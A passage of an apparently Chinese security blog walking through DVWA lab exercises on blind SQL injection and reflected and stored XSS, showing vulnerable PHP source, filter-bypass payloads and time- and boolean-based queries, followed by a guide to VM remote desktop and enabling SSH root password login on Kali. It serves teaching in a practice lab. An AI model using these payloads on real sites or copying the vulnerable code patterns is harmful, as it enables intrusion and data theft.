<p><img src="https://image.3001.net/images/20161122/14797991619669.png!small"></p>
<h2 id="impossible-6"><a href="#impossible-6" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $id = $_GET[ 'id' ]; 

    // Was a number entered? 
    if(is_numeric( $id )) { 
        // Check the database 
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); 
        $data->bindParam( ':id', $id, PDO::PARAM_INT ); 
        $data->execute(); 
        $row = $data->fetch(); 

        // Make sure only 1 result is returned 
        if( $data->rowCount() == 1 ) { 
            // Get values 
            $first = $row[ 'first_name' ]; 
            $last  = $row[ 'last_name' ]; 

            // Feedback for end user 
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
        } 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?><h2 id="-20"><a href="#-20" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
<h1 id="第八题-SQL-Injection-Blind"><a href="#第八题-SQL-Injection-Blind" class="headerlink" title="第八题-SQL-Injection-(Blind)"></a>第八题-SQL-Injection-(Blind)</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-14"><a href="#源代码-14" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_GET[ 'id' ]; 

    // Check database 
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 

    // Get results 
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
    if( $num > 0 ) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } 
    else { 
        // User wasn't found, so the page wasn't! 
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

    mysql_close(); 
} 

?><p><br>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，</p>
<p>User ID exists in the database.与User ID is MISSING from the database.，因此这里是SQL盲注漏洞。</p>
<h2 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h2><p>输入1’ and sleep(5) #，感觉到明显延迟；</p>
<h2 id="输入1-and-sleep-5-，没有延迟；"><a href="#输入1-and-sleep-5-，没有延迟；" class="headerlink" title="输入1 and sleep(5) #，没有延迟；"></a>输入1 and sleep(5) #，没有延迟；</h2><p>说明存在字符型的基于时间的盲注。</p>
<p>2.猜解当前数据库名<br>首先猜解数据名的长度：</p>
<hr>
<p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p>
<p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p>
<p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p>
<h2 id="1’-and-if-length-database-4-sleep-5-1-明显延迟"><a href="#1’-and-if-length-database-4-sleep-5-1-明显延迟" class="headerlink" title="1’ and if(length(database())=4,sleep(5),1) # 明显延迟"></a>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</h2><p>说明数据库名长度为4个字符。</p>
<h2 id="接着采用二分法猜解数据库名："><a href="#接着采用二分法猜解数据库名：" class="headerlink" title="接着采用二分法猜解数据库名："></a>接着采用二分法猜解数据库名：</h2><p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
<p>…</p>
<p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p>
<p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p>
<p>说明数据库名的第一个字符为小写字母d。</p>
<h2 id="…"><a href="#…" class="headerlink" title="…"></a>…</h2><p>重复上述步骤，即可猜解出数据库名。</p>
<p>3.猜解数据库中的表名<br>首先猜解数据库中表的数量：</p>
<hr>
<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p>
<h2 id="1’-and-if-select-count-table-name-from-information-schema-tables-where-table-schema-database-2-sleep-5-1-明显延迟"><a href="#1’-and-if-select-count-table-name-from-information-schema-tables-where-table-schema-database-2-sleep-5-1-明显延迟" class="headerlink" title="1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟"></a>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</h2><p>说明数据库中有两个表。</p>
<h2 id="接着挨个猜解表名："><a href="#接着挨个猜解表名：" class="headerlink" title="接着挨个猜解表名："></a>接着挨个猜解表名：</h2><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
<p>…</p>
<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</p>
<p>说明第一个表名的长度为9个字符。</p>
<h2 id="采用二分法即可猜解出表名。"><a href="#采用二分法即可猜解出表名。" class="headerlink" title="采用二分法即可猜解出表名。"></a>采用二分法即可猜解出表名。</h2><p>4.猜解表中的字段名<br>首先猜解表中字段的数量：</p>
<hr>
<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p>
<p>…</p>
<h2 id="1’-and-if-select-count-column-name-from-information-schema-columns-where-table-name-’users’-8-sleep-5-1-明显延迟"><a href="#1’-and-if-select-count-column-name-from-information-schema-columns-where-table-name-’users’-8-sleep-5-1-明显延迟" class="headerlink" title="1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟"></a>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</h2><p>说明users表中有8个字段。</p>
<h2 id="接着挨个猜解字段名："><a href="#接着挨个猜解字段名：" class="headerlink" title="接着挨个猜解字段名："></a>接着挨个猜解字段名：</h2><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
<p>…</p>
<h2 id="1’-and-if-length-substr-select-column-name-from-information-schema-columns-where-table-name-’users’-limit-0-1-1-7-sleep-5-1-明显延迟"><a href="#1’-and-if-length-substr-select-column-name-from-information-schema-columns-where-table-name-’users’-limit-0-1-1-7-sleep-5-1-明显延迟" class="headerlink" title="1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟"></a>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</h2><p>说明users表的第一个字段长度为7个字符。</p>
<p>采用二分法即可猜解出各个字段名。</p>
<p>5.猜解数据<br>同样采用二分法。</p>
<h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-15"><a href="#源代码-15" class="headerlink" title="源代码 "></a>源代码 </h2><?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $id = $_POST[ 'id' ]; 
    $id = mysql_real_escape_string( $id ); 

    // Check database 
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 

    // Get results 
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
    if( $num > 0 ) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } 
    else { 
        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

    //mysql_close(); 
} 

?><h2 id="-21"><a href="#-21" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
<p>\x00,\n,\r,,‘,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
<p>使用基于时间的盲注：</p>
<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
<p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0x7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><h2 id="源代码-16"><a href="#源代码-16" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_COOKIE[ 'id' ] ) ) { 
    // Get input 
    $id = $_COOKIE[ 'id' ]; 

    // Check database 
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; 
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 

    // Get results 
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
    if( $num > 0 ) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } 
    else { 
        // Might sleep a random amount 
        if( rand( 0, 5 ) == 3 ) { 
            sleep( rand( 2, 4 ) ); 
        } 

        // User wasn't found, so the page wasn't! 
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

    mysql_close(); 
} 

?><h2 id="-22"><a href="#-22" class="headerlink" title=" "></a> </h2><p>High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<h2 id="虽然添加了LIMIT-1，但是我们可以通过-将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注："><a href="#虽然添加了LIMIT-1，但是我们可以通过-将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注：" class="headerlink" title="虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注："></a>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注：</h2><p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
<p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
<h2 id="抓包将cookie中参数id改为1’-and-select-count-column-name-from-information-schema-columns-where-table-name-0x7573657273-8-，（0x7573657273-为users的16进制），显示存在，说明uers表有8个字段。"><a href="#抓包将cookie中参数id改为1’-and-select-count-column-name-from-information-schema-columns-where-table-name-0x7573657273-8-，（0x7573657273-为users的16进制），显示存在，说明uers表有8个字段。" class="headerlink" title="抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #，（0x7573657273 为users的16进制），显示存在，说明uers表有8个字段。"></a>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #，（0x7573657273 为users的16进制），显示存在，说明uers表有8个字段。</h2><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="源代码-17"><a href="#源代码-17" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $id = $_GET[ 'id' ]; 

    // Was a number entered? 
    if(is_numeric( $id )) { 
        // Check the database 
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); 
        $data->bindParam( ':id', $id, PDO::PARAM_INT ); 
        $data->execute(); 

        // Get results 
        if( $data->rowCount() == 1 ) { 
            // Feedback for end user 
            echo '<pre>User ID exists in the database.</pre>'; 
        } 
        else { 
            // User wasn't found, so the page wasn't! 
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

            // Feedback for end user 
            echo '<pre>User ID is MISSING from the database.</pre>'; 
        } 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?><h2 id="-23"><a href="#-23" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
<h1 id="第九题-XSS-Reflected"><a href="#第九题-XSS-Reflected" class="headerlink" title="第九题-XSS-(Reflected)"></a>第九题-XSS-(Reflected)</h1><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-18"><a href="#源代码-18" class="headerlink" title="源代码"></a>源代码</h2><?php 

// Is there any input? 

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 

    // Feedback for end user 

    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 

} 

?>
<hr>
<p>可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。<br><img src="https://image.3001.net/images/20161223/14824823248355.png!small"></p>
<h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-19"><a href="#源代码-19" class="headerlink" title="源代码"></a>源代码</h2><?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}</pre>"; 
} 
?>
<hr>
<p>这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script><br>删除，这种防护机制是可以被轻松绕过的。</p>
<p>输入&lt;sc<script>ript>alert(/xss/)</script>，成功弹框：<br><img src="https://image.3001.net/images/20161223/14824824105236.png!small"></p>
<h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><h2 id="源代码-20"><a href="#源代码-20" class="headerlink" title="源代码"></a>源代码</h2><?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Get input 
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}</pre>"; 
} 
?>
<hr>
<p>High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br>虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><img src=1 onerror=alert(/xss/)>
---
成功弹框：

<p><img src="https://image.3001.net/images/20161223/14824825209982.png!small"></p>
<h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="源代码-21"><a href="#源代码-21" class="headerlink" title="源代码"></a>源代码</h2><?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
    // Get input 
    $name = htmlspecialchars( $_GET[ 'name' ] ); 
    // Feedback for end user 
    echo "<pre>Hello ${name}</pre>"; 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 
?>
<hr>
<p>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素。</p>
<h1 id="第十题-XSS-Stored"><a href="#第十题-XSS-Stored" class="headerlink" title="第十题-XSS-(Stored)"></a>第十题-XSS-(Stored)</h1><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-22"><a href="#源代码-22" class="headerlink" title="源代码"></a>源代码</h2><?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = stripslashes( $message ); 
    $message = mysql_real_escape_string( $message ); 
    // Sanitize name input 
    $name = mysql_real_escape_string( $name ); 
    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    //mysql_close(); 
} 
?><h2 id="、"><a href="#、" class="headerlink" title="、"></a>、</h2><p>相关函数介绍</p>
<p>trim(string,charlist)</p>
<p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
<p>mysql_real_escape_string(string,connection)</p>
<p>函数会对字符串中的特殊符号（\x00，\n，\r，\，’，”，\x1a）进行转义。</p>
<p>stripslashes(string)</p>
<p>函数删除字符串中的反斜杠。</p>
<p>对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p>
<p>message一栏输入<script>alert(/xss/)</script>，成功弹框：</p>
<p><img src="https://image.3001.net/images/20161223/14824826941488.png!small"><br>name一栏前端有字数限制，抓包改为<script>alert(/name/)</script>：</p>
<p><img src="https://image.3001.net/images/20161223/14824827265355.png!small"><br>成功弹框：</p>
<p><img src="https://image.3001.net/images/20161223/14824827533689.png!small"></p>
<h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-23"><a href="#源代码-23" class="headerlink" title="源代码"></a>源代码</h2><?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = strip_tags( addslashes( $message ) ); 
    $message = mysql_real_escape_string( $message ); 
    $message = htmlspecialchars( $message ); 
    // Sanitize name input 
    $name = str_replace( '<script>', '', $name ); 
    $name = mysql_real_escape_string( $name ); 
    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    //mysql_close(); 
} 
?>
<hr>
<p>相关函数说明</p>
<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。</p>
<p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。</p>
<p>抓包改name参数为&lt;sc<script>ript>alert(/xss/)</script>:</p>
<p><img src="https://image.3001.net/images/20161223/14824828493990.png!small"><br>成功弹框：</p>
<p><img src="https://image.3001.net/images/20161223/14824828893635.png!small"></p>
<h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><h2 id="源代码-24"><a href="#源代码-24" class="headerlink" title="源代码"></a>源代码</h2><?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = strip_tags( addslashes( $message ) ); 
    $message = mysql_real_escape_string( $message ); 
    $message = htmlspecialchars( $message ); 
    // Sanitize name input 
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); 
    $name = mysql_real_escape_string( $name ); 
    // Update database 
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    //mysql_close(); 
} 
?>
<hr>
<p>这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p>
<p>抓包改name参数为<img src=1 onerror=alert(1)>：</p>
<p><img src="https://image.3001.net/images/20161223/14824830099169.png!small"><br>成功弹框：</p>
<p><img src="https://image.3001.net/images/20161223/1482483036879.png!small"></p>
<h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="源代码-25"><a href="#源代码-25" class="headerlink" title="源代码"></a>源代码</h2><?php 
if( isset( $_POST[ 'btnSign' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
    // Get input 
    $message = trim( $_POST[ 'mtxMessage' ] ); 
    $name    = trim( $_POST[ 'txtName' ] ); 
    // Sanitize message input 
    $message = stripslashes( $message ); 
    $message = mysql_real_escape_string( $message ); 
    $message = htmlspecialchars( $message ); 
    // Sanitize name input 
    $name = stripslashes( $name ); 
    $name = mysql_real_escape_string( $name ); 
    $name = htmlspecialchars( $name ); 
    // Update database 
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); 
    $data->bindParam( ':message', $message, PDO::PARAM_STR ); 
    $data->bindParam( ':name', $name, PDO::PARAM_STR ); 
    $data->execute(); 
} 
// Generate Anti-CSRF token 
generateSessionToken(); 
?>
<hr>
<p>通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/26/dvwa/" data-id="cklp4thjw0000lsutadxchh34" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-远程桌面连接" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/12/01/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" class="article-date">
  <time datetime="2020-12-01T13:24:01.000Z" itemprop="datePublished">2020-12-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/12/01/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/">远程桌面连接</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="#Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5">Windows远程桌面连接</a></p>
<p><a href="#kali%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5">kali远程桌面连接</a></p>
<h1 id="更改虚拟机IP地址"><a href="#更改虚拟机IP地址" class="headerlink" title="更改虚拟机IP地址"></a>更改虚拟机IP地址</h1><p><font size=4>1.打开VMware，点击编辑,点击虚拟网络编辑器。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB6e6ce9fa3dbba2289218aedcd47363a5?method=download&shareKey=c05dbcbe0a41154bb86d33dd550115d1"><br>2.点击虚拟网络编辑器中的更改设置。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB5af1c5a82211a3f643166ee26fdd894f?method=download&shareKey=cf048507567b71e3ec3a9c45f13bca76"><br>3.修改子网IP为10.1.1.0。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB77972a553405c699ac59fb597fc00588?method=download&shareKey=5a7aafe60d132db40ba1ce9ae81b80f4"><br>4.修改nat设置中网关IP为10.1.1.1<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe581ddfed84afc1dac26d44bcb9c24d0?method=download&shareKey=8474ab20c3b54f3fcf62384419d205af"><br>5.修改DHCP设置中起始IP地址为10.1.1.1，结束IP地址为10.1.1.254。<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa53df8acab35bd8c4fa32e855ae2e7fd?method=download&shareKey=a73785249970d394506cb11ee6ac28e9"><br>6.更改完成后点击确定，在Windows中使用ipconfig,Kali中使用ifconfig即可发现IP地址处于10.1.1.1的网段内。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB788dc068980522531431ac620d351ffb?method=download&shareKey=0044a78e504d9f6e9a71142fd435ec50"></font></p>
<h1 id="Windows远程桌面连接"><a href="#Windows远程桌面连接" class="headerlink" title="Windows远程桌面连接"></a>Windows远程桌面连接</h1><h2 id="一、虚拟机设置"><a href="#一、虚拟机设置" class="headerlink" title="一、虚拟机设置"></a>一、虚拟机设置</h2><p><font size=4>1.在虚拟机中右击计算机，点击属性，打开系统<br><img src="https://note.youdao.com/yws/api/personal/file/WEB3b3307b63bd167a12d7067da025c6621?method=download&shareKey=c9f2f3440158fcd9e818f3ab430f61a8"><br>2.点击左侧远程设置，进行如图设置<br><img src="https://note.youdao.com/yws/api/personal/file/WEB267fdf3118092e9be7abbafe8c2f16c4?method=download&shareKey=d50f53a29347e9d0b0de0614988d10d8"><br>3.点击选择用户，点击添加，点击高级<br><img src="https://note.youdao.com/yws/api/personal/file/WEB836e0c951722ec10d1c8b00ebd64da3f?method=download&shareKey=a080f41ba09a7e53523031adfaeab143"><br>4.选择1用户为everyone<br><img src="https://note.youdao.com/yws/api/personal/file/WEB66ca390e7ae4c4b4600e77043a0d751b?method=download&shareKey=d92e4a8e1e37c7e7a6d1835d57684cd4"><br>5.按windows+r输入cmd点击确定，输入ipconfig<br><img src="https://note.youdao.com/yws/api/personal/file/WEB7baf43892511b2aa0a83eb9bf7a3c168?method=download&shareKey=43103e3e2937ae072686263bfd51ebeb"><br>二、物理机连接</p>
<p>1.按windows+r输入mstsc点击确定，输入计算机名和用户名,点击链接。<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa849367a428afc6f5fd82a623125ea64?method=download&shareKey=30053c30ef54cd22002a3d9cac2c3d36"><br>2.输入密码<br><img src="https://note.youdao.com/yws/api/personal/file/WEBd8b210934894999823a0586715b36eba?method=download&shareKey=118cc0756aef29e204e515863c83ea08"><br>3.连接成功<br><img src="https://note.youdao.com/yws/api/personal/file/WEB5936d0bd56dc635770bddcedb95c933a?method=download&shareKey=da0a69e20546ef65d36405f334a46961"></p>
<h1 id="kali远程桌面连接"><a href="#kali远程桌面连接" class="headerlink" title="kali远程桌面连接"></a>kali远程桌面连接</h1><h2 id="一、连接前配置内容"><a href="#一、连接前配置内容" class="headerlink" title="一、连接前配置内容"></a>一、连接前配置内容</h2><p><font color=#ff0000 size=4><strong>1.修改ssh配置文件</strong></font></p>
<p><font size=4>在终端输入命令vi /etc/ssh/sshd_config<br><img src="https://note.youdao.com/yws/api/personal/file/WEBec926b52994f34a79616f9ef93ea367b?method=download&shareKey=76e178c39462007465ee99d3786cbd9f"><br>将PermitRootLogin without-password修改为：PermitRootLogin yes<br><img src="https://img-blog.csdnimg.cn/20200306110205883.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pha2Vsb3ZlXw==,size_16,color_FFFFFF,t_70"><br>找到#PasswordAuthentication yes 把#的注释去掉<br><img src="https://img-blog.csdnimg.cn/20200306110321870.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pha2Vsb3ZlXw==,size_16,color_FFFFFF,t_70"><br>修改完后，按ESC键,再按shift和：输入wq。保存退出。<br><font color=#ff0000 size=4><strong>2.启动ssh服务</strong></font></p>
<p>输入命令：/etc/init.d/ssh start<br><img src="https://img-blog.csdnimg.cn/20200306110605818.PNG"><br><font color=#ff0000 size=4><strong>3.设置开机启动</strong></font></p>
<p>输入命令：update-rc.d ssh enable<br><img src="https://img-blog.csdnimg.cn/20200306110656717.PNG"><br><font color=#ff0000 size=4><strong>4.重启Kali</strong></font></p>
<h2 id="二、使用xshell连接Kali"><a href="#二、使用xshell连接Kali" class="headerlink" title="二、使用xshell连接Kali"></a>二、使用xshell连接Kali</h2><p>在左边工作区中新建会话，名称为IP地址。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB4119d617840b2a8e6d9aa89bd1cb75d7?method=download&shareKey=04dadca4f078c0df6d07a43210368b84"><br>点击确定后，在工作区内点击该名称即可开始连接,输入用户名，输入密码。<br><img src="https://note.youdao.com/yws/api/personal/file/WEBca6850fcd2d6e23bdec18a5b848fd485?method=download&shareKey=7cc394d312f93fa5defa14ac4d791815"><br>连接成功后如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB2a9a3d51cc11fbdb2070e3885a9c1842?method=download&shareKey=7fb2f5c3387beae9e4894426aecfe802"></p>

      
    </div>
    <footer class="article-footer">
